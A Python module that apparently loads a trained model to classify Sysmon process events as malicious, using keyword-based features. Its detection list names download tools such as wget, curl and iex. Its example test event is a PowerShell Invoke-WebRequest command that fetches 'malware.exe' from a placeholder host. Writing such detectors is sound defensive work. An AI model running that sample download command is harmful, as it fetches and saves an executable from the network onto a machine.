import os
import joblib
import numpy as np
import pandas as pd
from typing import Dict, List, Any, Optional, Union
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SysmonPredictor:
    """Class for making predictions using the trained model"""
    
    def __init__(self, model_path: Optional[str] = None):
        """
        Initialize the predictor with a trained model
        
        Args:
            model_path: Path to the trained model file (.pkl)
        """
        self.model = None
        self.feature_columns = None
        self.label_encoders = None
        self.scaler = None
        self.model_metadata = {}
        
        if model_path:
            self.load_model(model_path)
    
    def load_model(self, model_path: str) -> None:
        """
        Load a trained model from disk
        
        Args:
            model_path: Path to the trained model file (.pkl)
        """
        try:
            if not os.path.exists(model_path):
                raise FileNotFoundError(f"Model file not found: {model_path}")
                
            # Load the model and its components
            model_data = joblib.load(model_path)
            
            self.model = model_data.get('model')
            self.feature_columns = model_data.get('feature_columns', [])
            self.label_encoders = model_data.get('label_encoders', {})
            self.scaler = model_data.get('scaler')
            self.model_metadata = {
                'timestamp': model_data.get('timestamp', 'unknown'),
                'model_type': model_data.get('model_type', 'unknown')
            }
            
            logger.info(f"Loaded model from {model_path} (trained on {self.model_metadata.get('timestamp')})")
            
        except Exception as e:
            logger.error(f"Error loading model: {str(e)}")
            raise
    
    def preprocess_event(self, event: Dict[str, Any]) -> Dict[str, Any]:
        """
        Preprocess a single event for prediction
        
        Args:
            event: Dictionary containing event data
            
        Returns:
            Dictionary with extracted features
        """
        if not isinstance(event, dict):
            raise ValueError("Event must be a dictionary")
            
        # Initialize features with default values
        features = {
            'command_length': len(str(event.get('command_line', ''))),
            'has_suspicious_keywords': 0,
            'process_name_length': len(str(event.get('process_name', ''))),
            'user_name_length': len(str(event.get('user', ''))),
            'is_system_user': 0,
            'has_network_activity': 0,
            'has_file_operations': 0,
            'has_registry_operations': 0
        }
        
        # Check for suspicious keywords in command line
        suspicious_keywords = [
            'powershell', 'cmd', 'wget', 'curl', 'invoke-', 'iex',
            'download', 'http', 'https', 'malware', 'exploit', 'shellcode'
        ]
        
        cmd_line = str(event.get('command_line', '')).lower()
        for keyword in suspicious_keywords:
            if keyword in cmd_line:
                features['has_suspicious_keywords'] = 1
                break
        
        # Check for system user
        user = str(event.get('user', '')).lower()
        if any(sys_user in user for sys_user in ['system', 'local system', 'nt authority\\system']):
            features['is_system_user'] = 1
        
        # Check for network activity (simplified)
        if any(net in cmd_line for net in ['http', 'https', 'tcp', 'udp', 'dns']):
            features['has_network_activity'] = 1
        
        # Check for file operations (simplified)
        if any(op in cmd_line for op in ['copy', 'move', 'del', 'rm', 'wget', 'curl']):
            features['has_file_operations'] = 1
        
        # Check for registry operations (simplified)
        if any(reg in cmd_line for reg in ['reg add', 'reg delete', 'reg import', 'reg save']):
            features['has_registry_operations'] = 1
        
        return features
    
    def predict(self, events: Union[Dict[str, Any], List[Dict[str, Any]]]) -> List[Dict[str, Any]]:
        """
        Make predictions on one or more events
        
        Args:
            events: Single event dictionary or list of event dictionaries
            
        Returns:
            List of prediction results with confidence scores
        """
        if not self.model:
            raise ValueError("Model not loaded. Call load_model() first.")
            
        # Convert single event to list for consistent processing
        single_event = False
        if isinstance(events, dict):
            events = [events]
            single_event = True
        
        results = []
        
        for event in events:
            try:
                # Preprocess the event
                features = self.preprocess_event(event)
                
                # Create feature vector in the correct order
                feature_vector = [features.get(col, 0) for col in self.feature_columns]
                
                # Scale features if scaler is available
                if self.scaler:
                    feature_vector = self.scaler.transform([feature_vector])[0]
                
                # Make prediction
                if hasattr(self.model, 'predict_proba'):
                    proba = self.model.predict_proba([feature_vector])[0]
                    confidence = float(max(proba))
                    prediction = int(proba.argmax())
                else:
                    prediction = int(self.model.predict([feature_vector])[0])
                    confidence = 1.0  # Default confidence if model doesn't provide probabilities
                
                # Get prediction label if label encoder is available
                if 'is_malicious' in self.label_encoders:
                    try:
                        prediction_label = self.label_encoders['is_malicious'].inverse_transform([prediction])[0]
                    except (ValueError, KeyError):
                        prediction_label = str(prediction)
                else:
                    prediction_label = str(prediction)
                
                # Prepare result
                result = {
                    'event_id': event.get('event_id', ''),
                    'prediction': prediction,
                    'prediction_label': prediction_label,
                    'confidence': confidence,
                    'is_malicious': bool(prediction == 1),  # Assuming 1 is malicious
                    'features': features
                }
                
                results.append(result)
                
            except Exception as e:
                logger.error(f"Error processing event {event.get('event_id', 'unknown')}: {str(e)}")
                results.append({
                    'event_id': event.get('event_id', ''),
                    'error': str(e),
                    'prediction': -1,
                    'is_malicious': False,
                    'confidence': 0.0
                })
        
        return results[0] if single_event else results

# Example usage
if __name__ == "__main__":
    # Initialize predictor
    predictor = SysmonPredictor("backend/ml_model/model.pkl")
    
    # Example event
    test_event = {
        "event_id": "test_123",
        "process_name": "powershell.exe",
        "command_line": "Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile malware.exe",
        "user": "SYSTEM"
    }
    
    # Make prediction
    try:
        result = predictor.predict(test_event)
        print("\nPrediction Result:")
        print(f"Event ID: {result['event_id']}")
        print(f"Is Malicious: {result['is_malicious']}")
        print(f"Confidence: {result['confidence']:.2f}")
        print(f"Prediction Label: {result['prediction_label']}")
        
    except Exception as e:
        print(f"Error: {str(e)}")
